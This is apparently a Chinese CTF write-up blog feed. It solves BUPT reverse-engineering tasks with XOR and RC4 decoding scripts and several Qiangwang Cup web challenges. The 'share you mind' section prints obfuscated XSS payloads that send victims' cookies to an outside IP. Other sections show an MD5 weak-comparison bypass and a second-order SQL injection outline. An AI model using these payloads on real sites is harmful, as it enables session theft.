class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修改调整数组<br><img src="/2018/04/03/北邮网安杯Writeup/20.jpg" alt="测试"><br>右键修改 重新F5得到清晰地代码 和密文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">unsigned int __thiscall sub_401490(CWnd *this)</div><div class="line">&#123;</div><div class="line">  CWnd *v1; // esi</div><div class="line">  unsigned int result; // eax</div><div class="line">  signed int v3; // eax</div><div class="line">  int v4; // eax</div><div class="line">  char v5[64]; // [esp+Bh] [ebp-81h]</div><div class="line">  __int16 v6; // [esp+89h] [ebp-3h]</div><div class="line">  char v7; // [esp+8Bh] [ebp-1h]</div><div class="line"></div><div class="line">  v1 = this;</div><div class="line">  v5[29] = 0;</div><div class="line">  memset(&amp;v5[30], 0, 0x60u);</div><div class="line">  v6 = 0;</div><div class="line">  v7 = 0;</div><div class="line">  v5[7] = 67;</div><div class="line">  v5[15] = 67;</div><div class="line">  v5[18] = 67;</div><div class="line">  v5[4] = 82;</div><div class="line">  v5[11] = 82;</div><div class="line">  v5[25] = 1;</div><div class="line">  v5[26] = 1;</div><div class="line">  v5[27] = 1;</div><div class="line">  v5[1] = 119;</div><div class="line">  v5[2] = 17;</div><div class="line">  v5[3] = 77;</div><div class="line">  v5[5] = 110;</div><div class="line">  v5[6] = 23;</div><div class="line">  v5[8] = 103;</div><div class="line">  v5[9] = 18;</div><div class="line">  v5[10] = 77;</div><div class="line">  v5[12] = 97;</div><div class="line">  v5[13] = 80;</div><div class="line">  v5[14] = 69;</div><div class="line">  v5[16] = 73;</div><div class="line">  v5[17] = 87;</div><div class="line">  v5[19] = 119;</div><div class="line">  v5[20] = 83;</div><div class="line">  v5[21] = 101;</div><div class="line">  v5[22] = 65;</div><div class="line">  v5[23] = 87;</div><div class="line">  v5[24] = 121;</div><div class="line">  v5[28] = 0;</div><div class="line">  result = CWnd::GetDlgItemTextA(this, 1000, &amp;v5[29], 100);</div><div class="line">  if ( result &gt; 0x23 || result &lt; 0xA )</div><div class="line">    result = CWnd::MessageBoxA(v1, aTheLengthOfStr, aHint, 0);</div><div class="line">  if ( v5[29] == 66 &amp;&amp; v5[30] == 85 &amp;&amp; v5[32] == 84 &amp;&amp; v5[31] == 80 &amp;&amp; v5[33] == 123 &amp;&amp; v5[61] == 125 )</div><div class="line">  &#123;</div><div class="line">    v3 = 5;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      v5[v3 + 29] = (v5[v3 + 29] + 1) ^ 0x23;</div><div class="line">      ++v3;</div><div class="line">    &#125;</div><div class="line">    while ( v3 &lt; 32 );</div><div class="line">    v4 = 0;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      v5[v4 + 34];</div><div class="line">      v5[v4++ + 1];</div><div class="line">    &#125;</div><div class="line">    while ( v4 + 5 &lt; 32 );</div><div class="line">    result = CWnd::MessageBoxA(v1, aCongratulation, aSuccess, 0);</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到密文之后可以进行 还原<br>Payload1<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">list=[<span class="number">119</span>, <span class="number">17</span>, <span class="number">77</span>,<span class="number">82</span>,<span class="number">110</span>,<span class="number">23</span>,<span class="number">67</span>, <span class="number">103</span>,<span class="number">18</span>,<span class="number">77</span>,<span class="number">82</span>,<span class="number">97</span>,<span class="number">80</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">73</span>,<span class="number">87</span>,<span class="number">67</span>,<span class="number">119</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">65</span>,<span class="number">87</span>,<span class="number">121</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>]</div><div class="line">str=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</div><div class="line">    str+=chr((i^<span class="number">0x23</span>)<span class="number">-1</span>)</div><div class="line"><span class="keyword">print</span> str</div><div class="line"><span class="comment">#  BUPT&#123;S1mpL3_C0mpAre_is_SoEasY!!!&#125;</span></div></pre></td></tr></table></figure></p>
<p>pyload2 无名师傅<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">intx()&#123;</div><div class="line">v6[<span class="number">6</span>]=<span class="number">67</span>;</div><div class="line">v6[<span class="number">14</span>]=<span class="number">67</span>;</div><div class="line">v6[<span class="number">17</span>]=<span class="number">67</span>;</div><div class="line">v6[<span class="number">3</span>]=<span class="number">82</span>;</div><div class="line">v6[<span class="number">10</span>]=<span class="number">82</span>;</div><div class="line">v6[<span class="number">24</span>]=<span class="number">1</span>;</div><div class="line">v6[<span class="number">25</span>]=<span class="number">1</span>;</div><div class="line">v6[<span class="number">26</span>]=<span class="number">1</span>;</div><div class="line">v6[<span class="number">0</span>]=<span class="number">119</span>;</div><div class="line">v6[<span class="number">1</span>]=<span class="number">17</span>;</div><div class="line">v6[<span class="number">2</span>]=<span class="number">77</span>;</div><div class="line">v6[<span class="number">4</span>]=<span class="number">110</span>;</div><div class="line">v6[<span class="number">5</span>]=<span class="number">23</span>;</div><div class="line">v6[<span class="number">7</span>]=<span class="number">103</span>;</div><div class="line">v6[<span class="number">8</span>]=<span class="number">18</span>;</div><div class="line">v6[<span class="number">9</span>]=<span class="number">77</span>;</div><div class="line">v6[<span class="number">11</span>]=<span class="number">97</span>;</div><div class="line">v6[<span class="number">12</span>]=<span class="number">80</span>;</div><div class="line">v6[<span class="number">13</span>]=<span class="number">69</span>;</div><div class="line">v6[<span class="number">15</span>]=<span class="number">73</span>;</div><div class="line">v6[<span class="number">16</span>]=<span class="string">'W'</span>;</div><div class="line">v6[<span class="number">18</span>]=<span class="number">119</span>;</div><div class="line">v6[<span class="number">19</span>]=<span class="number">83</span>;</div><div class="line">v6[<span class="number">20</span>]=<span class="number">101</span>;</div><div class="line">v6[<span class="number">21</span>]=<span class="string">'A'</span>;</div><div class="line">v6[<span class="number">22</span>]=<span class="string">'W'</span>;</div><div class="line">v6[<span class="number">23</span>]=<span class="string">'y'</span>;</div><div class="line"><span class="keyword">for</span>(inti=<span class="number">0</span>;i&lt;<span class="number">27</span>;i++)&#123;</div><div class="line"></div><div class="line">	v6[i]^=<span class="number">0x23</span>;</div><div class="line">	v6[i]=v6[i]<span class="number">-1</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(v6);</div><div class="line">return0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/2018/04/03/北邮网安杯Writeup/10.jpg" alt="测试"></p>
<h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p><img src="/2018/04/03/北邮网安杯Writeup/11.jpg" alt="流程"></p>
<p>简单走流程 猜测应该和RE1思路相似 需要解密某加密</p>
<p>载入分析</p>
<p><img src="/2018/04/03/北邮网安杯Writeup/12.jpg" alt="流程1"></p>
<p><img src="/2018/04/03/北邮网安杯Writeup/13.jpg" alt="流程2"></p>
<p><img src="/2018/04/03/北邮网安杯Writeup/14.jpg" alt="流程3"></p>
<p>分析可以得出 加密方式为RC4加密<br>解密流程与加密流程相同<br>可以写的脚本跑出密文并走过第二个函数进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># /usr/bin/python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#dump初始化后的密钥流，做xor运算,拿到密钥流直接跑函数2出结果</span></div><div class="line">data=[<span class="number">0x7C</span>,<span class="number">0x55</span>,<span class="number">0x3E</span>,<span class="number">0x5F</span>,<span class="number">0x0E</span>,<span class="number">0xB4</span>,<span class="number">0xCC</span>,<span class="number">0xB9</span>,<span class="number">0x77</span>,<span class="number">0xBF</span>,<span class="number">0x6B</span>,<span class="number">0xD9</span>,<span class="number">0x60</span>,<span class="number">0xE0</span>,<span class="number">0xB9</span>,<span class="number">0x68</span>,<span class="number">0xFB</span>,<span class="number">0x11</span>,<span class="number">0xCE</span>,<span class="number">0xD2</span>,<span class="number">0x15</span>,<span class="number">0x4B</span>,<span class="number">0x0E</span>,<span class="number">0xB5</span>,<span class="number">0xF7</span>,<span class="number">0x3E</span>,<span class="number">0x51</span>,<span class="number">0xEE</span>,<span class="number">0x51</span>,<span class="number">0x4D</span>,<span class="number">0x5A</span>,<span class="number">0x9C</span>,<span class="number">0x01</span>,<span class="number">0xA0</span>,<span class="number">0xC5</span>,<span class="number">0x3A</span>,<span class="number">0xD0</span>,<span class="number">0x38</span>]</div><div class="line">s=[<span class="number">0x53</span>,<span class="number">0x63</span>,<span class="number">0x04</span>,<span class="number">0xD5</span>,<span class="number">0x11</span>,<span class="number">0xFD</span>,<span class="number">0xC2</span>,<span class="number">0x3C</span>,<span class="number">0x83</span>,<span class="number">0x1D</span>,<span class="number">0xB3</span>,<span class="number">0x01</span>,<span class="number">0xA0</span>,<span class="number">0x0D</span>,<span class="number">0x8E</span>,<span class="number">0x95</span></div><div class="line">,<span class="number">0xD3</span>,<span class="number">0xF8</span>,<span class="number">0x6F</span>,<span class="number">0xE5</span>,<span class="number">0xF1</span>,<span class="number">0x94</span>,<span class="number">0x6D</span>,<span class="number">0xAA</span>,<span class="number">0x05</span>,<span class="number">0xCF</span>,<span class="number">0x32</span>,<span class="number">0x02</span>,<span class="number">0xB1</span>,<span class="number">0x35</span>,<span class="number">0x0E</span>,<span class="number">0x21</span></div><div class="line">,<span class="number">0x8A</span>,<span class="number">0x1F</span>,<span class="number">0xA9</span>,<span class="number">0x45</span>,<span class="number">0xCB</span>,<span class="number">0x4A</span>,<span class="number">0xDD</span>,<span class="number">0x1C</span>,<span class="number">0x71</span>,<span class="number">0x96</span>,<span class="number">0x58</span>,<span class="number">0x65</span>,<span class="number">0xED</span>,<span class="number">0x29</span>,<span class="number">0x38</span>,<span class="number">0xD6</span></div><div class="line">,<span class="number">0x16</span>,<span class="number">0xD9</span>,<span class="number">0xAB</span>,<span class="number">0xCC</span>,<span class="number">0xE2</span>,<span class="number">0x13</span>,<span class="number">0x91</span>,<span class="number">0x55</span>,<span class="number">0xBC</span>,<span class="number">0x43</span>,<span class="number">0x4B</span>,<span class="number">0x48</span>,<span class="number">0xF3</span>,<span class="number">0x3E</span>,<span class="number">0xC8</span>,<span class="number">0x6C</span></div><div class="line">,<span class="number">0x0C</span>,<span class="number">0x10</span>,<span class="number">0x15</span>,<span class="number">0xD1</span>,<span class="number">0xB4</span>,<span class="number">0x23</span>,<span class="number">0x52</span>,<span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0xC5</span>,<span class="number">0x7F</span>,<span class="number">0x77</span>,<span class="number">0xF2</span>,<span class="number">0xA4</span>,<span class="number">0x5D</span>,<span class="number">0xF6</span></div><div class="line">,<span class="number">0xFB</span>,<span class="number">0x67</span>,<span class="number">0xAC</span>,<span class="number">0x24</span>,<span class="number">0x72</span>,<span class="number">0x8D</span>,<span class="number">0x18</span>,<span class="number">0x09</span>,<span class="number">0x7C</span>,<span class="number">0x8F</span>,<span class="number">0xF4</span>,<span class="number">0xB8</span>,<span class="number">0x81</span>,<span class="number">0xB0</span>,<span class="number">0x44</span>,<span class="number">0xDC</span></div><div class="line">,<span class="number">0xA8</span>,<span class="number">0xE0</span>,<span class="number">0xC6</span>,<span class="number">0xDA</span>,<span class="number">0x00</span>,<span class="number">0x8B</span>,<span class="number">0x97</span>,<span class="number">0x60</span>,<span class="number">0xE3</span>,<span class="number">0x14</span>,<span class="number">0x9C</span>,<span class="number">0x34</span>,<span class="number">0xD7</span>,<span class="number">0xD8</span>,<span class="number">0x5B</span>,<span class="number">0x3F</span></div><div class="line">,<span class="number">0xFE</span>,<span class="number">0x2E</span>,<span class="number">0x33</span>,<span class="number">0x06</span>,<span class="number">0x7B</span>,<span class="number">0xDE</span>,<span class="number">0xC9</span>,<span class="number">0xE7</span>,<span class="number">0x9D</span>,<span class="number">0x5E</span>,<span class="number">0xF9</span>,<span class="number">0x3B</span>,<span class="number">0x75</span>,<span class="number">0x5F</span>,<span class="number">0x30</span>,<span class="number">0xA2</span></div><div class="line">,<span class="number">0xB6</span>,<span class="number">0xA3</span>,<span class="number">0x42</span>,<span class="number">0xAE</span>,<span class="number">0x85</span>,<span class="number">0x37</span>,<span class="number">0x28</span>,<span class="number">0x89</span>,<span class="number">0x66</span>,<span class="number">0xBA</span>,<span class="number">0x78</span>,<span class="number">0x07</span>,<span class="number">0xB9</span>,<span class="number">0x1E</span>,<span class="number">0x9A</span>,<span class="number">0x2B</span></div><div class="line">,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x39</span>,<span class="number">0xEB</span>,<span class="number">0x93</span>,<span class="number">0x2C</span>,<span class="number">0x64</span>,<span class="number">0x6B</span>,<span class="number">0x9B</span>,<span class="number">0x47</span>,<span class="number">0x80</span>,<span class="number">0xEC</span>,<span class="number">0xC0</span>,<span class="number">0xA1</span>,<span class="number">0x98</span>,<span class="number">0xFC</span></div><div class="line">,<span class="number">0xA6</span>,<span class="number">0xE6</span>,<span class="number">0xC3</span>,<span class="number">0x62</span>,<span class="number">0xAF</span>,<span class="number">0x17</span>,<span class="number">0x6A</span>,<span class="number">0xB7</span>,<span class="number">0x25</span>,<span class="number">0x5A</span>,<span class="number">0xE9</span>,<span class="number">0x5C</span>,<span class="number">0x54</span>,<span class="number">0x0A</span>,<span class="number">0x86</span>,<span class="number">0xD4</span></div><div class="line">,<span class="number">0xE4</span>,<span class="number">0xF0</span>,<span class="number">0x41</span>,<span class="number">0x0F</span>,<span class="number">0xB2</span>,<span class="number">0x0B</span>,<span class="number">0x7E</span>,<span class="number">0x9F</span>,<span class="number">0x4F</span>,<span class="number">0xCE</span>,<span class="number">0xF5</span>,<span class="number">0x99</span>,<span class="number">0xB5</span>,<span class="number">0xC4</span>,<span class="number">0x4D</span>,<span class="number">0xA7</span></div><div class="line">,<span class="number">0xCA</span>,<span class="number">0x19</span>,<span class="number">0x12</span>,<span class="number">0xE1</span>,<span class="number">0x8C</span>,<span class="number">0x36</span>,<span class="number">0xDF</span>,<span class="number">0xE8</span>,<span class="number">0x6E</span>,<span class="number">0x88</span>,<span class="number">0x22</span>,<span class="number">0xD2</span>,<span class="number">0x46</span>,<span class="number">0x26</span>,<span class="number">0xD0</span>,<span class="number">0x03</span></div><div class="line">,<span class="number">0xC1</span>,<span class="number">0xC7</span>,<span class="number">0x08</span>,<span class="number">0x31</span>,<span class="number">0xBB</span>,<span class="number">0x2A</span>,<span class="number">0x7D</span>,<span class="number">0x3A</span>,<span class="number">0xEF</span>,<span class="number">0x4C</span>,<span class="number">0xBD</span>,<span class="number">0xEE</span>,<span class="number">0xFA</span>,<span class="number">0x70</span>,<span class="number">0x50</span>,<span class="number">0xFF</span></div><div class="line">,<span class="number">0xCD</span>,<span class="number">0x20</span>,<span class="number">0x51</span>,<span class="number">0x40</span>,<span class="number">0x57</span>,<span class="number">0xA5</span>,<span class="number">0x82</span>,<span class="number">0x9E</span>,<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x2D</span>,<span class="number">0x84</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x4E</span>,<span class="number">0xBE</span></div><div class="line">,<span class="number">0x2F</span>,<span class="number">0x76</span>,<span class="number">0x7A</span>,<span class="number">0x90</span>,<span class="number">0x92</span>,<span class="number">0xDB</span>,<span class="number">0xF7</span>,<span class="number">0xAD</span>,<span class="number">0x3D</span>,<span class="number">0x87</span>,<span class="number">0x49</span>,<span class="number">0xBF</span>,<span class="number">0xEA</span>,<span class="number">0x79</span>,<span class="number">0x61</span>,<span class="number">0x27</span>]</div><div class="line"></div><div class="line">a1 = <span class="number">0</span></div><div class="line">a2 = <span class="number">0</span></div><div class="line">temp = <span class="number">0</span></div><div class="line">str=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>):</div><div class="line">    a1=(a1+<span class="number">1</span>)%<span class="number">256</span></div><div class="line">    a2=(a2+s[a1])%<span class="number">256</span></div><div class="line">    temp=s[a1]</div><div class="line">    s[a1]=s[a2]</div><div class="line">    s[a2]=temp</div><div class="line">    temp=(s[a1]+s[a2])%<span class="number">256</span></div><div class="line">    data[i]^=s[temp]</div><div class="line">    str+=chr(data[i])</div><div class="line"></div><div class="line"><span class="keyword">print</span> str</div><div class="line"></div><div class="line">运行即可跑出flag</div><div class="line"><span class="comment">#BUPT&#123;rc4_Cryptography_1sSOEa5y!-_-!!!&#125;</span></div></pre></td></tr></table></figure>
<p><img src="/2018/04/03/北邮网安杯Writeup/15.jpg" alt="流程4"></p>
<h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>2333太菜了比赛时间内没做出来0.0</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;WEB1-交易中心，你能买到FLAG吗？&quot;&gt;&lt;a href=&quot;#WEB1-交易中心，你能买到FLAG吗？&quot; class=&quot;headerlink&quot; title=&quot;WEB1 交易中心，你能买到FLAG吗？&quot;&gt;&lt;/a&gt;WEB1 交易中心，你能买到FLAG吗？&lt;/h3&gt;&lt;p&gt;提供了源码下载&lt;br&gt;&lt;img src=&quot;/2018/04/03/北邮网安杯Writeup/3.jpg&quot; alt=&quot;源码&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯部分Writeup</title>
    <link href="http://iosmosis.github.io/2018/03/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://iosmosis.github.io/2018/03/24/第二届强网杯部分Writeup/</id>
    <published>2018-03-24T11:31:37.000Z</published>
    <updated>2018-04-05T13:41:30.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>  Stegsolve–&gt;<br>  <img src="/2018/03/24/第二届强网杯部分Writeup/7.jpg" alt="网站入口"></p>
<ul>
<li><a id="more"></a>
<p><the rest="" of="" contents="" |="" 余下全文=""><br>偏移得到</the></p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/8.jpg" alt="网站入口"></p>
</li>
</ul>
<h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h4 id="进入web签到给的地址-http-39-107-33-96-10000"><a href="#进入web签到给的地址-http-39-107-33-96-10000" class="headerlink" title="进入web签到给的地址 http://39.107.33.96:10000/"></a>进入web签到给的地址 <a href="http://39.107.33.96:10000/" target="_blank" rel="external">http://39.107.33.96:10000/</a></h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/1.jpg" alt="网站入口"></p>
<h4 id="查看下网站源码-发现hint"><a href="#查看下网站源码-发现hint" class="headerlink" title="查看下网站源码 发现hint"></a>查看下网站源码 发现hint</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/2.jpg" alt="网站源码"></p>
<h4 id="需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型"><a href="#需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型" class="headerlink" title="需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型"></a>需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型</h4><h3 id="根据了解找到一组值"><a href="#根据了解找到一组值" class="headerlink" title="根据了解找到一组值"></a>根据了解找到一组值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">md5(240610708,32) = 0e462097431906509019562988736854</div><div class="line">md5(240610708,16) = 4319065090195629</div><div class="line"></div><div class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</div><div class="line">md5(QNKCDZO,16) = 4519934940580242</div></pre></td></tr></table></figure>
<h4 id="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过"><a href="#上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过" class="headerlink" title="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!"></a>上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!</h4><h3 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/3.jpg" alt="网站2"></p>
<h4 id="查看网站源码"><a href="#查看网站源码" class="headerlink" title="查看网站源码"></a>查看网站源码</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/4.jpg" alt="源码2"></p>
<h3 id="第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成"><a href="#第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成" class="headerlink" title="第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成"></a>第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/9.jpg" alt="源码2"></p>
<h3 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h3><p>注意到此题环境配置了pathinfo,并且涉及到XSS,所以推测是RPO.<br>当在Write article的内容处写入js代码(不能写标题,因为写入标题后会引入html标签).<br><img src="/2018/03/24/第二届强网杯部分Writeup/10.jpg" alt="源码2"><br>这样就相当于在网站写入了一段纯JS.</p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/11.jpg" alt="源码2"></p>
<p>访问<a href="http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO</a>.</p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/12.jpg" alt="源码2"></p>
<p>然后讲这个地址Export给后台的机器人就行了.<br>所以思路就是利用这个XSS去打COOKIE.<br>后端过滤了引号,利用fromCharCode绕过.<br>PAYLOAD:<br>(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,49,56,53,46,56,57,47) + document.cookie;<br>得到第一个cookie,提示需要进一步打子目录下的COOKIE.</p>
<p>引入一个iframe就行了,<br>PAYLAOD2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">105</span>,<span class="number">102</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>));</div><div class="line">iframe.src = <span class="built_in">String</span>.fromCharCode(<span class="number">47</span>,<span class="number">81</span>,<span class="number">87</span>,<span class="number">66</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">81</span>,<span class="number">87</span>,<span class="number">66</span>,<span class="number">47</span>);</div><div class="line">iframe.id = <span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>);</div><div class="line"><span class="built_in">document</span>.body.appendChild(iframe);</div><div class="line">iframe.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">  	<span class="keyword">var</span> c = <span class="built_in">document</span>.getElementById(<span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>)).contentWindow.document.cookie;</div><div class="line"><span class="keyword">var</span> n0t = <span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">108</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>));</div><div class="line">n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">108</span>), <span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">99</span>,<span class="number">104</span>));</div><div class="line">n0t.setAttribute(<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">102</span>), <span class="built_in">String</span>.fromCharCode(<span class="number">47</span>,<span class="number">47</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">56</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">47</span>,<span class="number">63</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">61</span>) + c);</div><div class="line"><span class="built_in">document</span>.head.appendChild(n0t);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h3><p>这道题考察二次注入.<br>注册时提供name,age,password参数;<br>登陆时会根据age参数在数据库中查询age相同的用户的用户名,并且显示出来.<br>age参数做了过滤,提示只能是数字,这里可以利用16进制编码绕过.<br>然后就是常规的二次布尔盲注流程了.<br>脚本如下,每注入出一项数据后,就需要修改下注册用户名的前缀.</p>
